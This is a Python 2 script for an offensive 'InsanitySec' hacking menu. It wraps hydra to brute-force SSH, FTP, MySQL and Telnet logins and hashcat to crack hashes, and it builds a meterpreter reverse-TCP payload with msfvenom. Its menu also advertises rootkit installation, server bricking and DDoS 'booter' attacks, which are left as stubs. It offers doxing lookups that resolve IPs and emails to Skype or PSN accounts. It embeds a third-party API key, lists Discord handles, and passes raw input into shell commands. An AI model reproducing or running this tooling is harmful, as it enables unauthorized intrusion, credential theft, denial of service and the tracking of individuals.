#!/usr/bin/env python2.7
import sys, os, time
import requests
from base64 import b64decode
from urllib import urlretrieve
from subprocess import call
print("\033[1;32;31m _____                      _ _           _____   ")        
print("\033[1;32;31m|_   _|                    (_) |         /  ___|          ")
print("\033[1;32;31m  | | _ __  ___  __ _ _ __  _| |_ _   _  \ `--.  ___  ___  Coded By Beta And Trav")
print("\033[1;32;31m  | || '_ \/ __|/ _` | '_ \| | __| | | |  `--. \/ _ \/ __| ======================")
print("\033[1;32;31m _| || | | \__ \ (_| | | | | | |_| |_| | /\__/ /  __/ (__  Thanks to MrVeQzy For")
print("\033[1;32;31m \___/_| |_|___/\__,_|_| |_|_|\__|\__, | \____/ \___|\___| The Server Commands")
print("\033[1;32;31m                                   __/ |                   ======================")
print("\033[1;32;31m                                  |___/                   ")
print("\033[1;32;31m ----------------------------------------------------------------------------")                                        
print("\033[1;32;31m - S E C U R I T Y  I S  J U S T  A  W O R D , D O  N O T  T R U S T  I T ! -")
print("\033[1;32;31m ----------------------------------------------------------------------------")
print("\033[1;32;31m======================================")
print("\033[1;32;31m            LINUX COMMANDS")
print("\033[1;32;31m======================================")
print("\033[1;32;40m[00]InsanitySec Members")
print("[01]\033[1;32;40mSSh Brute Force")
print("[02]\033[1;32;40mFTP Brute Force")
print("[03]\033[1;32;40mWebsite Vulnerability Scanner")
print("[04]\033[1;32;40mNmap Scan")
print("[05]\033[1;32;40mMetasploit Payload")
print("[06]\033[1;32;40mMySQL Brute Force")
print("[07]\033[1;32;40mTelnet Brute Force")
print("[08]\033[1;32;40mHash Cracker")
print("\033[1;32;31m======================================")
print("\033[1;32;31m            SERVER COMMANDS")
print("\033[1;32;31m======================================")
print("\033[1;32;40m[09]Install Silent Root User (private version)")
print("\033[1;32;40m[10]Install Root Kit (private version)")
print("\033[1;32;40m[11]Brick Server (private version)")
print("\033[1;32;31m======================================")
print("\033[1;32;31m            Booter Hub (VPS)          ")
print("\033[1;32;31m======================================")
print("\033[1;32;40m[12]UDP Attack (private version)")
print("\033[1;32;40m[13]LDAP Attack (private version)")
print("\033[1;32;40m[14]NTP Attack (private version)")
print("\033[1;32;40m[15]TCP Attack (private version)")
print("\033[1;32;40m[16]OVH Bypass (private version)")
print("\033[1;32;40m[17]CloudFlare Bypass (private version)")
print("\033[1;32;40m[18]CloudFlare UAM Bypass (private version)")
print("\033[1;32;40m[19]HTTPRAND (private version)")
print("\033[1;32;31m======================================")
print("\033[1;32;31m            API Commands              ")
print("\033[1;32;31m======================================")
print("\033[1;32;40m[20]DNS Lookup")
print("[21]\033[1;32;40mHost Search")
print("[22]\033[1;32;40mFind Shared dns")
print("[23]\033[1;32;40mGeo IP")
print("[24]\033[1;32;40mSubnetcalc")
print("[25]\033[1;32;40mHTTP Headers")
print("[26]\033[1;32;40mPage Links")
print("[27]\033[1;32;40mCloudFlare Resolver")
print("[28]\033[1;32;40mSkype Resolver")
print("[29]\033[1;32;40mIP To Skype")
print("[30]\033[1;32;40mEmail to Skype")
print("[31]\033[1;32;40mReverse DNS")
print("[32]\033[1;32;40mMTR")

skid = raw_input("\033[1;36;40mroot\033[1;37;40m@\033[1;32;31mInsanitySec\033[1;37;40m = ")



if skid == '00' or skid == '0':
	print("===========================")
	print("InsanitySec Members")
	print("The Botfather")
	print("MrVeQzy")
	print("Trav")
	print("Venz")
	print("Beta")
	print("Fairydarkrp")
	print("Barcode")
	print("Speshul")
	print("still")
	print("Agent")
	print("Empty")
	print("MrSmoke")
	print("NonYaBuizz")
	print("OSINTSec")
	print("Princess")
	print("Scxng")
	print("sugarplum")
	print("Zent")
	print("Hollywood")
	print("Lucifer")
	print("==========================")


elif skid == '01' or skid == '1':
	print("=================")
	print("|SSH Brute Force|")
	print("=================")
	root = raw_input("[*] Root User = ")
	passlist = raw_input("[*] Password List = ")
	host = raw_input("[*] Target IP = ")
	os.system("hydra -l %s -P %s %s ssh" % (root, passlist, host))
	sys.exit()

elif skid == '02' or skid == '2':
	print("=================")
	print("|FTP Brute Force|")
	print("=================")
	root = raw_input("[*] Root User = ")
	host = raw_input("[*] Target IP = ")
	passlist = raw_input("[*] Password List = ")
	os.system("hydra -l %s -P %s %s ftp" % (root, passlist, host))

elif skid == '03' or skid == '3':
	print("===============================")
	print("|Website Vulnerability Scanner|")
	print("===============================")
	webhost = raw_input("[*] Host = ")
	os.system("golismero scan %s " % (webhost,))

elif skid == '04' or skid == '4':
	print("==============")
	print("|Nmap Scanner|")
	print("==============")
	host = raw_input("[*] Host = ")
	os.system("nmap %s " % (host,))

elif skid == '05' or skid == '5':
	print("====================")
	print("|Metasploit Payload|")
	print("====================")
	lhost = raw_input("[*] LHOST = ")
	lport = raw_input("[*] LPORT = ")
	path = raw_input ("[*] File Path = ")
	name = raw_input ("[*] Payload Name = ")
	os.system("msfvenom -p meterpreter/reverse_tcp LHOST=%s  LPORT=%s -f -o /%s/%s  " % (lhost, lport, path, name ))

elif skid == '06' or skid == '6':
	print("===================")
	print("|MySQL Brute Force|")
	print("===================")
	root = raw_input("[*] MySQL User = ")
	passlist = raw_input("[*] Password List = ")
	host = raw_input("[*] Host = ")
	os.system("hydra -t 5 -V -f -l %s -e ns -P %s %s mysql" % (root, passlist, host))

elif skid == '07' or skid == '7':
	print("====================")
	print("|Telnet Beute Force|")
	print("====================")
	user = raw_input("[*] Telnet User = ")
	passlist = raw_input("[*] Password List = ")
	host = raw_input("[*] Host = ")
	os.system("hydra -l %s -P %s %s telnet" % (user, passlist, host))
	
elif skid == '08' or skid == '8':
    print("==============")
    print("|Hash Cracker|")
    print("==============")
    print("0 = MD5")
    print("10 = md5($pass.$salt)")
    print("20 = md5($salt.$pass)")
    print("50 = HMAC-MD5 (key = $pass)")
    print("60 = HMAC-MD5 (key = $salt)")
    print("100 = SHA1")
    print("110 = sha1($pass.$salt)")
    print("120 = sha1($salt.$pass)")
    print("150 = HMAC-SHA1 (key = $pass)")
    print("160 = HMAC-SHA1 (key = $salt)")
    print("200 = MySQL")
    print("300 = MySQL4.1/MySQL5")
    print("400 - phpass, MD5(Wordpress), MD5(phpBB3)")
    print("500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5")
    print("800 = SHA-1(Django)")
    print("900 = MD4")
    print("1000 = NTLM")
    type = raw_input("Pick A Number For Your Hash = ")
    hash = raw_input("Hash text File = ")
    password_list = raw_input("Password List = ")
    os.system("hashcat -m %s -a 0 %s %s" % (type, hash, password_list))

elif skid == '12':   
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '13': 
    print("=========")
    print("|Private|")
    print("=========")
    
elif skid == '09' or skid == '9':
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '10':   
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '11':
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '14':
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '15':
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '16':
    print("=========")
    print("|Private|")
    print("=========")
    
elif skid == '17':
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '18':
    print("=========")
    print("|Private|")
    print("=========")

elif skid == '19':
    print("=========")
    print("|Private|")
    print("=========")
    
elif skid == '20':
    target = raw_input("[*] Web Host = ")
    request = requests.get("https://api.hackertarget.com/dnslookup/?q="+target)
    print(request.text)

elif skid == '21':
    target = raw_input("[*] Web Host = ")
    request = requests.get("https://api.hackertarget.com/hostsearch/?q="+target)
    print(request.text)

elif skid == '22':
    target = raw_input("[*] Web Host = ")
    request = requests.get("https://api.hackertarget.com/findshareddns/?q="+target)
    print(request.text)

elif skid == '23':
    target = raw_input("[*] Target IP = ")
    request = requests.get("https://api.hackertarget.com/geoip/?q="+target)
    print(request.text)

elif skid == '24':
    target = raw_input("[*] Web Host = ")
    request = requests.get("https://api.hackertarget.com/subnetcalc/?q="+target)
    print(request.text)

elif skid == '25':
    target = raw_input("[*] Web Host = ")
    request = requests.get("https://api.hackertarget.com/httpheaders/?q="+target)
    print(request.text)

elif skid == '26':
    target = raw_input("[*] Web Host = ")
    request = requests.get("https://api.hackertarget.com/pagelinks/?q="+target)
    print(request.text)

elif skid == '27':
    target = raw_input("[*] Web Host = ")
    request = requests.get("https://webresolver.nl/api.php?key=7YCJZ-76C13-QEN79-3T1GS&html=0&action=cloudflare&string="+target)
    print(request.text)

elif skid == '28':
    target = raw_input("[*] Skype User = ")
    request = requests.get("https://webresolver.nl/api.php?key=7YCJZ-76C13-QEN79-3T1GS&html=0&action=resolve&string="+target)
    print(request.text)

elif skid == '29':
    target = raw_input("[*] IP = ")
    request = requests.get("https://webresolver.nl/api.php?key=7YCJZ-76C13-QEN79-3T1GS&html=0&action=ip2skype&string="+target)
    print(request.text)

elif skid == '30':
    target = raw_input("[*] Email = ")
    request = requests.get("https://webresolver.nl/api.php?key=7YCJZ-76C13-QEN79-3T1GS&html=0&action=email2skype&string="+target)
    print(request.text)

elif skid == '31':
    target = raw_input("[*] Target IP = ")
    request = requests.get("https://api.hackertarget.com/reversedns/?q="+target)
    print(request.text)

elif skid == '32':
    target = raw_input("[*] Target IP = ")
    request = requests.get("https://api.hackertarget.com/mtr/?q="+target)
    print(request.text)
	
elif skid == '33':
    target = raw_input("[*] PSN = ")
    request = requests.get("https://psnresolver.org/resolve/"+target)
    print(request.text)

elif skid == 'skid list':
    print("SKID LIST")
    print("=======================")
    print("TXTG-YoungKing#5398")
    print("z Proxyz z#6666")
    print("HelloimXo#9792")
    print("Tristen#3979")
    print("iNulledASkid#8351")
    print("=======================")